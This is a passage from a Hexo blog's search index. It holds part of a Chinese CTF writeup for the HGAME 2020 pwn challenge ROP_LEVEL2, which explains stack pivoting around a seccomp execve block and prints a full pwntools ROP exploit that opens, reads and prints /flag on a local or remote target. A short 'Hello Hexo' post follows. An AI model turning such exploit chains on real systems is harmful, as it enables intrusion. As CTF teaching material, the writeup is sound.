title="week3"></a>week3</h3><p>week3开题的时候…我正在看CCTV-8直播的绝代双骄，古龙的武侠小说写的真是精彩呀，新版的绝代双骄电视剧的还原度很高，而且排在春节黄金档，焉能不看！于是week3只做了一道题，没想到还拿了2血，剩下的都是堆的题，不会啊…</p><h3 id="ROP-LEVEL2"><a href="#ROP-LEVEL2" class="headerlink" title="ROP_LEVEL2"></a>ROP_LEVEL2</h3><ul><li>题目描述：-</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week3_1/ROP" target="_blank" rel="noopener">ROP</a></li><li>考察点：ROP攻击、栈迁移、<code>seccomp</code></li><li>难度：中等</li><li>分值：200</li><li>完成人数：27</li></ul><h4 id="0x0-背景姿势-1"><a href="#0x0-背景姿势-1" class="headerlink" title="0x0 背景姿势"></a>0x0 背景姿势</h4><p>这题和week1的ROP_LEVEL0差不多，但是开启了<code>seccomp</code>，且栈溢出只有8字节</p><p><code>seccomp</code>用于关闭不必要的系统调用，比如<code>SYSCALL execve</code> </p><h4 id="0x1-漏洞分析"><a href="#0x1-漏洞分析" class="headerlink" title="0x1 漏洞分析"></a>0x1 漏洞分析</h4><ul><li><p>栈溢出8字节，需要栈迁移</p></li><li><p>用<code>seccomp</code>关闭了<code>SYSCALL execve</code> </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v0 = seccomp_init(<span class="number">0x7FFF0000</span>LL);</span><br><span class="line">seccomp_rule_add(v0, <span class="number">0L</span>L, <span class="number">0x3B</span>LL, <span class="number">0L</span>L);</span><br><span class="line">seccomp_load(v0);</span><br></pre></td></tr></table></figure></div></li><li><p>不能用<code>system(&#39;/bin/sh&#39;)</code>，于是用<code>open+read+puts</code>打开<code>/flag</code>文件并打印</p><ul><li><code>open(&#39;/flag&#39;,0,0x100)</code></li><li><code>read(4,bss_base,0x100)</code></li><li><code>puts(bss_base)</code></li></ul></li></ul><h4 id="0x2-exp-1"><a href="#0x2-exp-1" class="headerlink" title="0x2 exp"></a>0x2 exp</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./ROP'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x0000000000400a43</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">leave = <span class="number">0x000000000040090d</span> <span class="comment"># leave ; ret</span></span><br><span class="line">m3c = <span class="number">0x00400a20</span></span><br><span class="line">p6r = <span class="number">0x00400a3a</span></span><br><span class="line">prsi = <span class="number">0x0000000000400a41</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">prbp = <span class="number">0x0000000000400830</span> <span class="comment"># pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">buf = <span class="number">0x6010a0</span></span><br><span class="line">open_func = <span class="number">0x400985</span></span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">open_plt = elf.symbols[<span class="string">'open'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">bss_base = elf.bss() + <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">80</span></span><br><span class="line">payload = <span class="string">'\0'</span>*offset</span><br><span class="line">payload += p64(buf)</span><br><span class="line">payload += p64(leave)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open('/flag',0,0x100)</span></span><br><span class="line">stack = p64(p6r) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(buf+<span class="number">0x8</span>*<span class="number">9</span>) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(buf+<span class="number">0x8</span>*<span class="number">18</span>) + p64(m3c) + p64(open_plt)</span><br><span class="line"><span class="comment"># read(4,bss_base,0x100)</span></span><br><span class="line">stack += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(buf+<span class="number">0x8</span>*<span class="number">17</span>) + p64(<span class="number">0x100</span>) + p64(bss_base) + p64(<span class="number">0x4</span>) + p64(m3c) + p64(read_plt)</span><br><span class="line"><span class="comment"># padding</span></span><br><span class="line">stack += <span class="string">'/flag\0\0\0'</span></span><br><span class="line">stack += p64(<span class="number">0xdeadbeef</span>)*<span class="number">5</span></span><br><span class="line"><span class="comment"># pust(bss_base)</span></span><br><span class="line">stack += p64(prdi) + p64(bss_base) + p64(puts_plt) + p64(<span class="number">0xdeadbeef</span>) </span><br><span class="line"></span><br><span class="line">ru(<span class="string">'think so?'</span>)</span><br><span class="line">sl(<span class="string">'TaQini!!'</span>+stack)</span><br><span class="line">rc()</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment"># sleep(3)</span></span><br><span class="line">sl(<span class="string">'TaQini is here~~~'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h3><p>week4只有两道题，想必是极难的，week3也还剩下3道题，留个坑，以后看。</p><p>(杭电出的题目，水准很高~ 必须点个赞^_^)</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>这次春节蹭新生赛，真是涨了不少姿势，感谢出题的杭电师傅们，感谢<a href="https://imagin.vip/" target="_blank" rel="noopener">imagin</a>师傅的帐号~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> writeup </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROP </tag>
            
            <tag> double free </tag>
            
            <tag> unsorted bin leak </tag>
            
            <tag> shellcode </tag>
            
            <tag> 栈迁移 </tag>
            
            <tag> shell基础 </tag>
            
            <tag> proc </tag>
            
            <tag> GOT覆写 </tag>
            
            <tag> seccomp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Hexo</title>
      <link href="/2020/02/10/Hello-Hexo/"/>
      <url>/2020/02/10/Hello-Hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-Hexo"><a href="#Hello-Hexo" class="headerlink" title="Hello Hexo"></a>Hello Hexo</h1><blockquote><p>Talk is cheap. Show me the code.</p><p>​                                        ~ Linus Torvalds</p></blockquote><p>最近在搭博客，实在是忍受不了<code>Wordpress</code>具具具丑的代码高亮了<br>鹅且，居然还不支持<code>markdown</code>这么好的语言，于是改用<code>hexo</code>啦~</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hello Hexo"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Markdown is sooooo great!"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hexo is better than wordpress~"</span></span><br></pre></td></tr></table></figure></div><p>这里主要会发一些藕业余参加CTF比赛的writeup，以及一些技术总结，linux使用心得啊什么的<br>欢迎各位小伙伴关注~<br>欢迎师傅们交流、交换友链~</p>]]></content>
      
      
      <categories>
          
          <category> none </category>
          
      </categories>
      
      
        <tags>
            
            <tag> none </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
